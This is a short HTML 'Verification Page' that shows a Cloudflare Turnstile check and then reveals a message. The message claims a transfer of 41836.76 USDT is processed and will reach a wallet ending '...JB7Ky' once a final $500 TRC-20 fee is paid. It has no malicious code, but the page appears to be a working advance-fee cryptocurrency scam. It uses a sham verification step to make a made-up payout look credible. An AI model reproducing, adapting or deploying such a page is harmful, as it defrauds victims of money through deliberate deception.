<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <title>Verification Page</title>



  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>



  <style>

    body {

      font-family: Arial, sans-serif;

      background: #f5f5f5;

      display: flex;

      justify-content: center;

      align-items: center;

      height: 100vh;

      margin: 0;

    }



    .box {

      background: white;

      padding: 40px;

      border-radius: 12px;

      box-shadow: 0 0 20px rgba(0,0,0,0.1);

      text-align: center;

      width: 420px;

    }



    #message {

      display: none;

      margin-top: 20px;

      background: #f0fff4;

      padding: 15px;

      border-radius: 10px;

      border: 1px solid #28a745;

    }



    h2 {

      margin-bottom: 20px;

    }

  </style>

</head>



<body>



<div class="box">



  <h2>Please complete verification</h2>



  <div
  class="cf-turnstile"
  data-sitekey="1x00000000000000000000AA"
  data-callback="verificationSuccess">
</div>

  <div id="message">

    <h2>✅ Verification Complete</h2>



    <p>

      You’ve been successfully VERIFIED.

    </p>



    <p>

      Your transfer of 41836.76 USDT is now completely processed on the blockchain market and should have it released to your Wallet Address ending (...JB7Ky) after this last (TRC-20) fee of $500 is completed.

    </p>



    <p>

      Thank you! You’ve been successfully verified.

    </p>

  </div>



</div>



<script>

function verificationSuccess() {

  document.getElementById("message").style.display = "block";

}

</script>



</body>

</html>
